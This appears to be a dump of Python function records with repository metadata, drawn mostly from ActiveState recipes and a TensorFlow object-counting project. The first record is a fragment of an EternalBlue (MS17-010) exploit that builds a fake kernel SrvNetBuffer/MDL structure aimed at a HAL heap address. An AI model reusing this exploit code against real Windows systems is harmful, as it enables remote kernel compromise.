{"docstring": "# 0x180 is size of fakeSrvNetBufferX64\n", "func_signal": "def createFakeSrvNetBuffer(sc_size):\n", "code": "totalRecvSize = 0x80 + 0x180 + sc_size\nfakeSrvNetBufferX64 = '\\x00'*16\nfakeSrvNetBufferX64 += pack('<HHIQ', 0xfff0, 0, 0, TARGET_HAL_HEAP_ADDR)  # flag, _, _, pNetRawBuffer\nfakeSrvNetBufferX64 += pack('<QII', 0, 0x82e8, 0)  # _, thisNonPagedPoolSize, _\nfakeSrvNetBufferX64 += '\\x00'*16\nfakeSrvNetBufferX64 += pack('<QQ', 0, totalRecvSize)  # offset 0x40\nfakeSrvNetBufferX64 += pack('<QQ', TARGET_HAL_HEAP_ADDR, TARGET_HAL_HEAP_ADDR)  # pmdl2, pointer to fake struct\nfakeSrvNetBufferX64 += pack('<QQ', 0, 0)\nfakeSrvNetBufferX64 += '\\x00'*16\nfakeSrvNetBufferX64 += '\\x00'*16\nfakeSrvNetBufferX64 += pack('<QHHI', 0, 0x60, 0x1004, 0)  # MDL.Next, MDL.Size, MDL.MdlFlags\nfakeSrvNetBufferX64 += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR-0x80)  # MDL.Process, MDL.MappedSystemVa\nreturn fakeSrvNetBufferX64", "path": "pentest/exploit_win/ms17-010/eternalblue8_exploit.py", "commit_date": "2017-08-22 00:00:00", "repo_name": "jivoi/pentest", "stars": 1450, "license": "None", "language": "python", "size": 90828}
{"docstring": "'''\nLoad DB from a file.\n'''\n", "func_signal": "def Load(self, dbFile):\n", "code": "with open(dbFile, 'rb') as fp:\n    self.db.update(cPickle.load(fp))", "path": "code/recipes/Python/578081_Manage_hashes_in_database_files/recipe-578081.py", "commit_date": "2017-07-26 00:00:00", "repo_name": "ActiveState/code", "stars": 1906, "license": "mit", "language": "python", "size": 12344}
{"docstring": "'''\nDeletes entries that are no longer valid.\nChecks if file exists and if it has the same modify time stamp, if not\nthen the entry is deleted from the DB.\nmaxAge (in seconds) can also be passed in, it is used to check against\nthe last time the entry was accessed in the DB and if the entry is\nolder than maxAge, then it is deleted from the DB.\n'''\n", "func_signal": "def Cleanup(self, maxAge=None):\n", "code": "deletes = []\nfor path, (mtime, atime, cache) in self.db.iteritems():\n    if not os.path.isfile(path) or \\\n                (maxAge is not None and atime < time.time()-maxAge) or \\\n                mtime != int(os.stat(path).st_mtime):\n        deletes.append(path)\nfor path in deletes:\n    del self.db[path]", "path": "code/recipes/Python/578081_Manage_hashes_in_database_files/recipe-578081.py", "commit_date": "2017-07-26 00:00:00", "repo_name": "ActiveState/code", "stars": 1906, "license": "mit", "language": "python", "size": 12344}
{"docstring": "# inspired by Alex Martelli\n# http://aspn.activestate.com/ASPN/Cookbook/Python/Recipe/52234\n", "func_signal": "def sorted_copy(alist):\n", "code": "indices = map(_generate_index, alist)\ndecorated = zip(indices, alist)\ndecorated.sort()\nreturn [ item for index, item in decorated ]", "path": "code/recipes/Python/135435_Sort_string_using_numeric/recipe-135435.py", "commit_date": "2017-07-26 00:00:00", "repo_name": "ActiveState/code", "stars": 1906, "license": "mit", "language": "python", "size": 12344}
{"docstring": "\"\"\"works the way a good mkdir should :)\n    - already exists, silently complete\n    - regular file in the way, raise an exception\n    - parent directory(ies) does not exist, make them as well\n\"\"\"\n", "func_signal": "def _mkdir(newdir):\n", "code": "if os.path.isdir(newdir):\n    pass\nelif os.path.isfile(newdir):\n    raise OSError(\"a file with the same name as the desired \" \\\n                  \"dir, '%s', already exists.\" % newdir)\nelse:\n    head, tail = os.path.split(newdir)\n    if head and not os.path.isdir(head):\n        _mkdir(head)\n    #print \"_mkdir %s\" % repr(newdir)\n    if tail:\n        os.mkdir(newdir)", "path": "code/recipes/Python/82465_a_friendly_mkdir/recipe-82465.py", "commit_date": "2017-07-26 00:00:00", "repo_name": "ActiveState/code", "stars": 1906, "license": "mit", "language": "python", "size": 12344}
{"docstring": "'''\nWrite DB to file.\n'''\n", "func_signal": "def Write(self, dbFile):\n", "code": "with open(dbFile, 'wb') as fp:\n    cPickle.dump(self.db, fp)", "path": "code/recipes/Python/578081_Manage_hashes_in_database_files/recipe-578081.py", "commit_date": "2017-07-26 00:00:00", "repo_name": "ActiveState/code", "stars": 1906, "license": "mit", "language": "python", "size": 12344}
{"docstring": "# copied from UserDict.DictMixin\n# Make progressively weaker assumptions about \"other\"\n", "func_signal": "def update(self, other=None, **kwargs):\n", "code": "if other is None:\n    pass\nelif hasattr(other, 'iteritems'):\n    for k, v in other.iteritems():\n        self[k] = v\nelif hasattr(other, 'keys'):\n    for k in other.keys():\n        self[k] = other[k]\nelse:\n    for k, v in other:\n        self[k] = v\nfor k, v in kwargs.iteritems():\n    self[k] = v", "path": "code/recipes/Python/499373_Fixed_keys_mapping_type/recipe-499373.py", "commit_date": "2017-07-26 00:00:00", "repo_name": "ActiveState/code", "stars": 1906, "license": "mit", "language": "python", "size": 12344}
{"docstring": "\"\"\"Run the main windows message loop.\"\"\"\n", "func_signal": "def WinMSGLoop():\n", "code": "from ctypes import POINTER, byref, c_ulong\nfrom ctypes.wintypes import BOOL, HWND, MSG, UINT\n\nLPMSG = POINTER(MSG)\nLRESULT = c_ulong\nGetMessage = get_winfunc(\"user32\", \"GetMessageW\", BOOL, (LPMSG, HWND, UINT, UINT))\nTranslateMessage = get_winfunc(\"user32\", \"TranslateMessage\", BOOL, (LPMSG,))\n# restype = LRESULT\nDispatchMessage = get_winfunc(\"user32\", \"DispatchMessageW\", LRESULT, (LPMSG,))\n\nmsg = MSG()\nlpmsg = byref(msg)\nwhile GetMessage(lpmsg, HWND(), 0, 0) > 0:\n    TranslateMessage(lpmsg)\n    DispatchMessage(lpmsg)", "path": "code/recipes/Python/577654_DDE_Client/recipe-577654.py", "commit_date": "2017-07-26 00:00:00", "repo_name": "ActiveState/code", "stars": 1906, "license": "mit", "language": "python", "size": 12344}
{"docstring": "\"\"\"\nA simple, stupid example of a ProgressMeter iterable generator function\n\"\"\"\n", "func_signal": "def dummy_gen( alices, bobs ):\n", "code": "for alice in alices:\n    for bob in bobs:\n        if bob==alice:\n            yield 'Match: %s==%s' % ( str(alice), str(bob) )\n        else:\n            yield 'No Match: %s!=%s' % ( str(alice), str(bob) )", "path": "code/recipes/Python/576674_StatusMeter_widget_for_Tkinter/recipe-576674.py", "commit_date": "2017-07-26 00:00:00", "repo_name": "ActiveState/code", "stars": 1906, "license": "mit", "language": "python", "size": 12344}
{"docstring": "\"\"\"\nIterates through the target generator using delayed self referencing\nfuncition calls to allow GUI updates between iterations\n\"\"\"\n", "func_signal": "def iterGen( self ):\n", "code": "try:\n    msg = self.targetGen.next()                                         # Execute the next iteration of the genrator\nexcept StopIteration:\n    self.reset()                                                        # When the generator is finished, a StopIteration exception is raised.  This signals a normal finish in the generator\n    self.statusMessage = 'Completed'\n    self.event_generate( '<<Finished>>' )                               # A <<Finished>> virtual event signals the GUI that the progress meter is finished\n    return\nself.targetIdx += 1\nself.drawBar()\nif msg == None:\n    pass\nelif msg.startswith( 'AbortIteration' ):                                # The target generator can signal that something irrevocable has happend by yielding a value of 'AbortIteration'\n    self.reset()\n    self.statusMessage = msg\n    self.event_generate( '<<Finished>>' )\n    return\nelse:\n    self.statusMessage = msg                                            # If the generator yields a value other than None or 'AbortIteration', this message will be sent out to the controlling gui\n    self.event_generate( '<<StatusRequest>>' )\nif self.killVar.get() == 1:                                             # Occurs if the user clicks the killBtn\n    self.reset()\n    self.statusMessage = 'Canceled'\n    self.event_generate( '<<Finished>>' )\n    return\nself.update_idletasks()\nself.after_idle( self.iterGen )", "path": "code/recipes/Python/576674_StatusMeter_widget_for_Tkinter/recipe-576674.py", "commit_date": "2017-07-26 00:00:00", "repo_name": "ActiveState/code", "stars": 1906, "license": "mit", "language": "python", "size": 12344}
{"docstring": "\"\"\"\nSplits a string into alpha and numeric elements, which\nis used as an index for sorting\"\n\"\"\"\n#\n# the index is built progressively\n# using the _append function\n#\n", "func_signal": "def _generate_index(str):\n", "code": "index = []\ndef _append(fragment, alist=index):\n    if fragment.isdigit(): fragment = int(fragment)\n    alist.append(fragment)\n\n# initialize loop\nprev_isdigit = str[0].isdigit()\ncurrent_fragment = ''\n# group a string into digit and non-digit parts\nfor char in str:\n    curr_isdigit = char.isdigit()\n    if curr_isdigit == prev_isdigit:\n        current_fragment += char\n    else:\n        _append(current_fragment)\n        current_fragment = char\n        prev_isdigit = curr_isdigit\n_append(current_fragment)    \nreturn tuple(index)", "path": "code/recipes/Python/135435_Sort_string_using_numeric/recipe-135435.py", "commit_date": "2017-07-26 00:00:00", "repo_name": "ActiveState/code", "stars": 1906, "license": "mit", "language": "python", "size": 12344}
{"docstring": "\"\"\"\nInitializes the target generator function with supplied arguments and\nkeyword.  Requests Tk to call iterGen after all idle events have been\nhandled.\n\nArguments:\n  targetGen:  The target generator function\n  targetLen:  The number of iterations in the target generator\n  targetArgs: The arguments for the generator function\n  targetKwds: The keyword arguments fo the generator function\nNote:\n  Having iterGen called by Tk ensures that redraws and other sorts of\n  normal Tkinter events can be processed.  Results in the status bar\n  updating real-time with execution while allowing the GUI to function\n  normally.\n\"\"\"\n", "func_signal": "def startGen( self, targetGen, targetLen, targetArgs=[], targetKwds={} ):\n", "code": "self.targetGen = targetGen( *targetArgs, **targetKwds )\nself.targetLen = targetLen\nself.killBtn.configure( state=NORMAL )\nself.after_idle( self.iterGen )", "path": "code/recipes/Python/576674_StatusMeter_widget_for_Tkinter/recipe-576674.py", "commit_date": "2017-07-26 00:00:00", "repo_name": "ActiveState/code", "stars": 1906, "license": "mit", "language": "python", "size": 12344}
{"docstring": "# normalize arguments to a (key,value) iterable\n", "func_signal": "def __init__(self, seq=(), **kwds):\n", "code": "if hasattr(seq, 'keys'):\n    get = seq.__getitem__\n    seq = ((k,get(k)) for k in seq.keys())\nif kwds:\n    seq = chain(seq, kwds.iteritems())\n# scan the items keeping track of the keys' order\nkeys,values = [],[]\nkeys_set = set()\nfor k,v in seq:\n    if k not in keys_set:\n        keys_set.add(k)\n        keys.append(k)\n        values.append(v)\n    else:\n        values[keys.index(k)] = v\n# mutate self to the appropriate subclass\nself.__class__ = self._subcls_factory(*keys)\nself._values = values", "path": "code/recipes/Python/499373_Fixed_keys_mapping_type/recipe-499373.py", "commit_date": "2017-07-26 00:00:00", "repo_name": "ActiveState/code", "stars": 1906, "license": "mit", "language": "python", "size": 12344}
{"docstring": "\"\"\"\nResets the control values or the generator function and also clears the\nprogress bar\n\"\"\"\n", "func_signal": "def reset( self ):\n", "code": "self.canv.delete( 'bar' )\nself.canv.delete( 'text' )\nself.killBtn.configure( state=DISABLED )\nself.targetGen = None\nself.targetArgs = []\nself.targetKwds = []\nself.killVar.set( 0 )\nself.targetIdx = 0\nself.targetLen = 0", "path": "code/recipes/Python/576674_StatusMeter_widget_for_Tkinter/recipe-576674.py", "commit_date": "2017-07-26 00:00:00", "repo_name": "ActiveState/code", "stars": 1906, "license": "mit", "language": "python", "size": 12344}
{"docstring": "\"\"\"Temporarily set an attribute on an object for the duration of the\ncontext manager.\"\"\"\n", "func_signal": "def temp_setattr(ob, attr, new_value):\n", "code": "replaced = False\nold_value = None\nif hasattr(ob, attr):\n    try:\n        if attr in ob.__dict__:\n            replaced = True\n    except AttributeError:\n        if attr in ob.__slots__:\n            replaced = True\n    if replaced:\n        old_value = getattr(ob, attr)\nsetattr(ob, attr, new_value)\nyield replaced, old_value\nif not replaced:\n    delattr(ob, attr)\nelse:\n    setattr(ob, attr, old_value)", "path": "code/recipes/Python/577089_Context_manager_temporarily_set_attribute/recipe-577089.py", "commit_date": "2017-07-26 00:00:00", "repo_name": "ActiveState/code", "stars": 1906, "license": "mit", "language": "python", "size": 12344}
{"docstring": "\"\"\"\nInitializes this ProgressMeter\n\nArguments:\n  parent:   The master widget for this ProgressMeter\n  height:   The desired height of the progress bar\n\"\"\"\n", "func_signal": "def __init__( self, parent, height=30 ):\n", "code": "self.parent = parent\nFrame.__init__( self, parent )\nself.columnconfigure( 0, weight=1 )                                     # Forces the canv object to resize any time this widget is resized \nself.rowconfigure( 0, weight=1 )\nself.statusMessage = 'Normal'\nself.w = 0\nself.h = 0\nself.canv = Canvas( self, height=height)                                # This canvas will display the progress bar and accompanying percentage text\nself.canv.grid( row=1, column=0, sticky=N+S+E+W )\nself.canv.bind( '<Configure>', lambda e:\n                self.resize( e.width, e.height ) )                      # When the canvas is resized the progress bar should be redrawn.\nself.killVar = IntVar()                                                 # The killBtn can cancel execution\nself.killVar.set( 0 )\nself.killBtn = Button( self, text='Cancel',\n                       command=lambda: self.killVar.set(1) )\nself.killBtn.configure( state=DISABLED )\nself.killBtn.grid( row=1, column=1 )\nself.targetGen = None                                                   # Placekeeper for the generator function that will be metered\nself.targetArgs = []                                                    # Argument list for the generator function\nself.targetKwds = {}                                                    # Keyword dictionary for the generator funciton\nself.targetIdx = 0                                                      # Keeps track of which step in iteration is currently being executed\nself.targetLen = 0                                                      # Total number of steps in exectuion", "path": "code/recipes/Python/576674_StatusMeter_widget_for_Tkinter/recipe-576674.py", "commit_date": "2017-07-26 00:00:00", "repo_name": "ActiveState/code", "stars": 1906, "license": "mit", "language": "python", "size": 12344}
{"docstring": "\"\"\"Retrieve a function from a library, and set the data types.\"\"\"\n", "func_signal": "def get_winfunc(libname, funcname, restype=None, argtypes=(), _libcache={}):\n", "code": "from ctypes import windll\n\nif libname not in _libcache:\n    _libcache[libname] = windll.LoadLibrary(libname)\nfunc = getattr(_libcache[libname], funcname)\nfunc.argtypes = argtypes\nfunc.restype = restype\n\nreturn func", "path": "code/recipes/Python/577654_DDE_Client/recipe-577654.py", "commit_date": "2017-07-26 00:00:00", "repo_name": "ActiveState/code", "stars": 1906, "license": "mit", "language": "python", "size": 12344}
{"docstring": "# copied from UserDict.DictMixin\n", "func_signal": "def __cmp__(self, other):\n", "code": "if other is None:\n    return 1\nif isinstance(other, UserDict.DictMixin):\n    other = dict(other.iteritems())\nreturn cmp(dict(self.iteritems()), other)", "path": "code/recipes/Python/499373_Fixed_keys_mapping_type/recipe-499373.py", "commit_date": "2017-07-26 00:00:00", "repo_name": "ActiveState/code", "stars": 1906, "license": "mit", "language": "python", "size": 12344}
{"docstring": "# if cls is hidden, find its first non hidden ancestor\n", "func_signal": "def _subcls_factory(cls, *keys):\n", "code": "cls = (c for c in cls.mro() if not issubclass(c,_Hidden)).next()\n# each (non hidden) class maintains its own registry\ntry: registry = cls.__dict__['_Registry']\nexcept KeyError:\n    registry = cls._Registry = {}\ntry: return registry[keys]\nexcept KeyError:\n    cls_name = '%s_%d' % (cls.__name__, abs(hash(keys)))\n    cls_dict = {\n        '__slots__' : (),\n        '_keys' : keys,\n        '_key2index' : dict((k,i) for i,k in enumerate(keys))\n    }\n    registry[keys] = sub = type(cls_name, (cls,_Hidden), cls_dict)\n    return sub", "path": "code/recipes/Python/499373_Fixed_keys_mapping_type/recipe-499373.py", "commit_date": "2017-07-26 00:00:00", "repo_name": "ActiveState/code", "stars": 1906, "license": "mit", "language": "python", "size": 12344}
{"docstring": "'''\nCalculate the hash of a file.\n'''\n", "func_signal": "def CalcFileHash(path, hashtype, buffer=8192):\n", "code": "hash = getattr(hashlib, hashtype)()\nwith open(path, 'rb') as fp:\n    while 1:\n        data = fp.read(buffer)\n        if not data:\n            break\n        hash.update(data)\nreturn hash.digest()", "path": "code/recipes/Python/578081_Manage_hashes_in_database_files/recipe-578081.py", "commit_date": "2017-07-26 00:00:00", "repo_name": "ActiveState/code", "stars": 1906, "license": "mit", "language": "python", "size": 12344}
{"docstring": "\"\"\"\nHandles resize events for the canv widget.  Adjusts the height and width\nof the canvas for the progress bar calculations.\n\nArguments:\n  w: The new width\n  h: The new height\n\"\"\"\n", "func_signal": "def resize( self, w, h ):\n", "code": "self.w = w\nself.h = h\nself.canv.delete( 'frame' )\nself.canv.create_rectangle( 1, 1, self.w, self.h, outline='black',\n                            fill='gray75', tag='frame' )", "path": "code/recipes/Python/576674_StatusMeter_widget_for_Tkinter/recipe-576674.py", "commit_date": "2017-07-26 00:00:00", "repo_name": "ActiveState/code", "stars": 1906, "license": "mit", "language": "python", "size": 12344}
{"docstring": "#box_color= (0, 255, 255)\n", "func_signal": "def draw_box_label(id,img, bbox_cv2, box_color=(0, 255, 0), show_label=True):\n", "code": "font = cv2.FONT_HERSHEY_SIMPLEX\nfont_size = 0.7\nfont_color = (0, 0, 255)\nleft, top, right, bottom = bbox_cv2[1], bbox_cv2[0], bbox_cv2[3], bbox_cv2[2]\n\n# Draw the bounding box\ncv2.rectangle(img, (left, top), (right, bottom), box_color, 4)   \n\nif show_label:       \n    cv2.rectangle(img, (left-2, top-45), (right+2, top), box_color, -1, 1)\n    \n    object_id = 'object_ID:'+str(id)\n    cv2.putText(img,object_id,(left,top-25), font, font_size, font_color, 1, cv2.LINE_AA)\n\nreturn img", "path": "tensorflow_object_counting_api/utils/object_tracking_module/tracking_utils.py", "commit_date": "2019-12-08 00:00:00", "repo_name": "ahmetozlu/tensorflow_object_counting_api", "stars": 1305, "license": "mit", "language": "python", "size": 341899}
{"docstring": "#load the image\n", "func_signal": "def color_histogram_of_test_image(test_src_image):\n", "code": "image = test_src_image\n\nchans = cv2.split(image)\ncolors = (\"b\", \"g\", \"r\")\nfeatures = []\nfeature_data = \"\"\ncounter = 0\nfor (chan, color) in zip(chans, colors):\n\tcounter = counter + 1\n\n\thist = cv2.calcHist([chan], [0], None, [256], [0, 256])\n\tfeatures.extend(hist)\n\n\t# find the peak pixel values for R, G, and B\n\telem = np.argmax(hist)\n\n\tif (counter == 1):\n\t\tblue = str(elem)\n\telif (counter ==2):\n\t\tgreen = str(elem)\n\telif (counter ==3):\n\t\tred = str(elem)\n\t\tfeature_data = red + \",\" + green + \",\" + blue\nwith open(current_path+\"/utils/color_recognition_module/\"+\"test.data\", \"w\") as myfile:\t\t\t\t\t\t\n\tmyfile.write(feature_data)", "path": "tensorflow_object_counting_api/utils/color_recognition_module/color_histogram_feature_extraction.py", "commit_date": "2019-06-03 00:00:00", "repo_name": "ahmetozlu/tensorflow_object_counting_api", "stars": 1305, "license": "mit", "language": "python", "size": 341899}
{"docstring": "\"\"\"Checks if a label map is valid.\n\nArgs:\n  label_map: StringIntLabelMap to validate.\n\nRaises:\n  ValueError: if label map is invalid.\n\"\"\"\n", "func_signal": "def _validate_label_map(label_map):\n", "code": "for item in label_map.item:\n  if item.id < 1:\n    raise ValueError('Label map ids should be >= 1.')", "path": "tensorflow_object_counting_api/utils/label_map_util.py", "commit_date": "2019-06-03 00:00:00", "repo_name": "ahmetozlu/tensorflow_object_counting_api", "stars": 1305, "license": "mit", "language": "python", "size": 341899}
{"docstring": "\"\"\"Convert predicted output tensors to final detections. Unused.\n\nArgs:\n  prediction_dict: a dictionary holding prediction tensors.\n  true_image_shapes: int32 tensor of shape [batch, 3] where each row is\n    of the form [height, width, channels] indicating the shapes\n    of true images in the resized images, as resized images can be padded\n    with zeros.\n  **params: Additional keyword arguments for specific implementations of\n    DetectionModel.\n\nReturns:\n  detections: a dictionary with empty fields.\n\"\"\"\n", "func_signal": "def postprocess(self, prediction_dict, true_image_shapes, **params):\n", "code": "return {\n    'detection_boxes': None,\n    'detection_scores': None,\n    'detection_classes': None,\n    'num_detections': None\n}", "path": "tensorflow_object_counting_api/smurf_counter_training/legacy/trainer_test.py", "commit_date": "2019-08-12 00:00:00", "repo_name": "ahmetozlu/tensorflow_object_counting_api", "stars": 1305, "license": "mit", "language": "python", "size": 341899}
{"docstring": "\"\"\"Compute scalar loss tensors with respect to provided groundtruth.\n\nCalling this function requires that groundtruth tensors have been\nprovided via the provide_groundtruth function.\n\nArgs:\n  prediction_dict: a dictionary holding predicted tensors\n  true_image_shapes: int32 tensor of shape [batch, 3] where each row is\n    of the form [height, width, channels] indicating the shapes\n    of true images in the resized images, as resized images can be padded\n    with zeros.\n\nReturns:\n  a dictionary mapping strings (loss names) to scalar tensors representing\n    loss values.\n\"\"\"\n", "func_signal": "def loss(self, prediction_dict, true_image_shapes):\n", "code": "batch_reg_targets = tf.stack(\n    self.groundtruth_lists(fields.BoxListFields.boxes))\nbatch_cls_targets = tf.stack(\n    self.groundtruth_lists(fields.BoxListFields.classes))\nweights = tf.constant(\n    1.0, dtype=tf.float32,\n    shape=[len(self.groundtruth_lists(fields.BoxListFields.boxes)), 1])\n\nlocation_losses = self._localization_loss(\n    prediction_dict['box_encodings'], batch_reg_targets,\n    weights=weights)\ncls_losses = self._classification_loss(\n    prediction_dict['class_predictions_with_background'], batch_cls_targets,\n    weights=weights)\n\nloss_dict = {\n    'localization_loss': tf.reduce_sum(location_losses),\n    'classification_loss': tf.reduce_sum(cls_losses),\n}\nreturn loss_dict", "path": "tensorflow_object_counting_api/smurf_counter_training/legacy/trainer_test.py", "commit_date": "2019-08-12 00:00:00", "repo_name": "ahmetozlu/tensorflow_object_counting_api", "stars": 1305, "license": "mit", "language": "python", "size": 341899}
{"docstring": "\"\"\"Reads a label map and returns a category index.\n\nArgs:\n  label_map_path: Path to `StringIntLabelMap` proto text file.\n\nReturns:\n  A category index, which is a dictionary that maps integer ids to dicts\n  containing categories, e.g.\n  {1: {'id': 1, 'name': 'dog'}, 2: {'id': 2, 'name': 'cat'}, ...}\n\"\"\"\n", "func_signal": "def create_category_index_from_labelmap(label_map_path):\n", "code": "label_map = load_labelmap(label_map_path)\nmax_num_classes = max(item.id for item in label_map.item)\ncategories = convert_label_map_to_categories(label_map, max_num_classes)\nreturn create_category_index(categories)", "path": "tensorflow_object_counting_api/utils/label_map_util.py", "commit_date": "2019-06-03 00:00:00", "repo_name": "ahmetozlu/tensorflow_object_counting_api", "stars": 1305, "license": "mit", "language": "python", "size": 341899}
{"docstring": "\"\"\"Encodes a numpy array into a PNG string.\n\nArgs:\n  image: a numpy array with shape [height, width, 3].\n\nReturns:\n  PNG encoded image string.\n\"\"\"\n", "func_signal": "def encode_image_array_as_png_str(image):\n", "code": "image_pil = Image.fromarray(np.uint8(image))\noutput = six.BytesIO()\nimage_pil.save(output, format='PNG')\npng_string = output.getvalue()\noutput.close()\nreturn png_string", "path": "tensorflow_object_counting_api/utils/visualization_utils.py", "commit_date": "2019-12-08 00:00:00", "repo_name": "ahmetozlu/tensorflow_object_counting_api", "stars": 1305, "license": "mit", "language": "python", "size": 341899}
{"docstring": "\"\"\"Reads a label map and returns a dictionary of label names to id.\n\nArgs:\n  label_map_path: path to label_map.\n  use_display_name: whether to use the label map items' display names as keys.\n\nReturns:\n  A dictionary mapping label names to id.\n\"\"\"\n", "func_signal": "def get_label_map_dict(label_map_path, use_display_name=False):\n", "code": "label_map = load_labelmap(label_map_path)\nlabel_map_dict = {}\nfor item in label_map.item:\n  if use_display_name:\n    label_map_dict[item.display_name] = item.id\n  else:\n    label_map_dict[item.name] = item.id\nreturn label_map_dict", "path": "tensorflow_object_counting_api/utils/label_map_util.py", "commit_date": "2019-06-03 00:00:00", "repo_name": "ahmetozlu/tensorflow_object_counting_api", "stars": 1305, "license": "mit", "language": "python", "size": 341899}
{"docstring": "\"\"\"Input preprocessing, resizes images to 28x28.\n\nArgs:\n  inputs: a [batch, height_in, width_in, channels] float32 tensor\n    representing a batch of images with values between 0 and 255.0.\n\nReturns:\n  preprocessed_inputs: a [batch, 28, 28, channels] float32 tensor.\n  true_image_shapes: int32 tensor of shape [batch, 3] where each row is\n    of the form [height, width, channels] indicating the shapes\n    of true images in the resized images, as resized images can be padded\n    with zeros.\n\"\"\"\n", "func_signal": "def preprocess(self, inputs):\n", "code": "true_image_shapes = [inputs.shape[:-1].as_list()\n                     for _ in range(inputs.shape[-1])]\nreturn tf.image.resize_images(inputs, [28, 28]), true_image_shapes", "path": "tensorflow_object_counting_api/smurf_counter_training/legacy/trainer_test.py", "commit_date": "2019-08-12 00:00:00", "repo_name": "ahmetozlu/tensorflow_object_counting_api", "stars": 1305, "license": "mit", "language": "python", "size": 341899}
{"docstring": "\"\"\"Draws mask on an image.\n\nArgs:\n  image: uint8 numpy array with shape (img_height, img_height, 3)\n  mask: a uint8 numpy array of shape (img_height, img_height) with\n    values between either 0 or 1.\n  color: color to draw the keypoints with. Default is red.\n  alpha: transparency value between 0 and 1. (default: 0.7)\n\nRaises:\n  ValueError: On incorrect data type for image or masks.\n\"\"\"\n", "func_signal": "def draw_mask_on_image_array(image, mask, color='red', alpha=0.7):\n", "code": "if image.dtype != np.uint8:\n  raise ValueError('`image` not of type np.uint8')\nif mask.dtype != np.uint8:\n  raise ValueError('`mask` not of type np.uint8')\nif np.any(np.logical_and(mask != 1, mask != 0)):\n  raise ValueError('`mask` elements should be in [0, 1]')\nrgb = ImageColor.getrgb(color)\npil_image = Image.fromarray(image)\n\nsolid_color = np.expand_dims(\n    np.ones_like(mask), axis=2) * np.reshape(list(rgb), [1, 1, 3])\npil_solid_color = Image.fromarray(np.uint8(solid_color)).convert('RGBA')\npil_mask = Image.fromarray(np.uint8(255.0*alpha*mask)).convert('L')\npil_image = Image.composite(pil_solid_color, pil_image, pil_mask)\nnp.copyto(image, np.array(pil_image.convert('RGB')))", "path": "tensorflow_object_counting_api/utils/visualization_utils.py", "commit_date": "2019-12-08 00:00:00", "repo_name": "ahmetozlu/tensorflow_object_counting_api", "stars": 1305, "license": "mit", "language": "python", "size": 341899}
{"docstring": "\"\"\"Prediction tensors from inputs tensor.\n\nArgs:\n  preprocessed_inputs: a [batch, 28, 28, channels] float32 tensor.\n  true_image_shapes: int32 tensor of shape [batch, 3] where each row is\n    of the form [height, width, channels] indicating the shapes\n    of true images in the resized images, as resized images can be padded\n    with zeros.\n\nReturns:\n  prediction_dict: a dictionary holding prediction tensors to be\n    passed to the Loss or Postprocess functions.\n\"\"\"\n", "func_signal": "def predict(self, preprocessed_inputs, true_image_shapes):\n", "code": "flattened_inputs = tf.contrib.layers.flatten(preprocessed_inputs)\nclass_prediction = tf.contrib.layers.fully_connected(\n    flattened_inputs, self._num_classes)\nbox_prediction = tf.contrib.layers.fully_connected(flattened_inputs, 4)\n\nreturn {\n    'class_predictions_with_background': tf.reshape(\n        class_prediction, [-1, 1, self._num_classes]),\n    'box_encodings': tf.reshape(box_prediction, [-1, 1, 4])\n}", "path": "tensorflow_object_counting_api/smurf_counter_training/legacy/trainer_test.py", "commit_date": "2019-08-12 00:00:00", "repo_name": "ahmetozlu/tensorflow_object_counting_api", "stars": 1305, "license": "mit", "language": "python", "size": 341899}
{"docstring": "\"\"\"Loads label map proto.\n\nArgs:\n  path: path to StringIntLabelMap proto text file.\nReturns:\n  a StringIntLabelMapProto\n\"\"\"\n", "func_signal": "def load_labelmap(path):\n", "code": "with tf.gfile.GFile(path, 'r') as fid:\n  label_map_string = fid.read()\n  label_map = string_int_label_map_pb2.StringIntLabelMap()\n  try:\n    text_format.Merge(label_map_string, label_map)\n  except text_format.ParseError:\n    label_map.ParseFromString(label_map_string)\n_validate_label_map(label_map)\nreturn label_map", "path": "tensorflow_object_counting_api/utils/label_map_util.py", "commit_date": "2019-06-03 00:00:00", "repo_name": "ahmetozlu/tensorflow_object_counting_api", "stars": 1305, "license": "mit", "language": "python", "size": 341899}
{"docstring": "\"\"\"Creates dictionary of COCO compatible categories keyed by category id.\n\nArgs:\n  categories: a list of dicts, each of which has the following keys:\n    'id': (required) an integer id uniquely identifying this category.\n    'name': (required) string representing category name\n      e.g., 'cat', 'dog', 'pizza'.\n\nReturns:\n  category_index: a dict containing the same entries as categories, but keyed\n    by the 'id' field of each category.\n\"\"\"\n", "func_signal": "def create_category_index(categories):\n", "code": "category_index = {}\nfor cat in categories:\n  category_index[cat['id']] = cat\nreturn category_index", "path": "tensorflow_object_counting_api/utils/label_map_util.py", "commit_date": "2019-06-03 00:00:00", "repo_name": "ahmetozlu/tensorflow_object_counting_api", "stars": 1305, "license": "mit", "language": "python", "size": 341899}
{"docstring": "\"\"\"Saves an image (represented as a numpy array) to PNG.\n\nArgs:\n  image: a numpy array with shape [height, width, 3].\n  output_path: path to which image should be written.\n\"\"\"\n", "func_signal": "def save_image_array_as_png(image, output_path):\n", "code": "image_pil = Image.fromarray(np.uint8(image)).convert('RGB')\nwith tf.gfile.Open(output_path, 'w') as fid:\n  image_pil.save(fid, 'PNG')", "path": "tensorflow_object_counting_api/utils/visualization_utils.py", "commit_date": "2019-12-08 00:00:00", "repo_name": "ahmetozlu/tensorflow_object_counting_api", "stars": 1305, "license": "mit", "language": "python", "size": 341899}
{"docstring": "# detect image color by using image file name to label training data\n", "func_signal": "def color_histogram_of_training_image(img_name):\n", "code": "\tif \"red\" in img_name:\n\t\tdata_source = \"red\"\n\telif \"yellow\" in img_name:\n\t\tdata_source = \"yellow\"\n\telif \"green\" in img_name:\n\t\tdata_source = \"green\"\n\telif \"orange\" in img_name:\n\t\tdata_source = \"orange\"\n\telif \"white\" in img_name:\n\t\tdata_source = \"white\"\n\telif \"black\" in img_name:\n\t\tdata_source = \"black\"\n\telif \"blue\" in img_name:\n\t\tdata_source = \"blue\"\n\telif \"violet\" in img_name:\n\t\tdata_source = \"violet\"\n\n\t#load the image\n\timage = cv2.imread(img_name)\n\n\tchans = cv2.split(image)\n\tcolors = (\"b\", \"g\", \"r\")\n\tfeatures = []\n\tfeature_data = \"\"\n\tcounter = 0\n\tfor (chan, color) in zip(chans, colors):\n\t\tcounter = counter + 1\n\t\t\n\t\thist = cv2.calcHist([chan], [0], None, [256], [0, 256])\n\t\tfeatures.extend(hist)\n\t\t\n\t\t# find the peak pixel values for R, G, and B\n\t\telem = np.argmax(hist)\n\n\t\tif (counter == 1):\n\t\t\tblue = str(elem)\n\t\telif (counter ==2):\n\t\t\tgreen = str(elem)\n\t\telif (counter ==3):\n\t\t\tred = 